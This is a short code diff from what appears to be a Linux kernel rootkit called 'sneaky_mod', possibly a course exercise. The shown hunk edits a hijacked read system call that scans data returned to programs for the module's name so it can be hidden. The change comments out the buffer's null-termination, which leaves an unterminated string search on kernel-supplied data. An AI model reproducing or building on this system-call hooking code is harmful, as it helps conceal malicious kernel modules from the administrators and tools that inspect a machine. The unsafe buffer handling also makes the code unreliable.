@@ -88,8 +88,8 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
   int sz;
   sz = original_read(fd, buf, count);
   char * temp = (char*)buf;
-  temp[sz] = '\0';
-  char * target = "sneaky_mod";
+  //temp[sz] = '\0';
+  char * target = "sneaky_mod ";
   char * res = strstr(temp, target);
   if(res){
     char * curr = res;
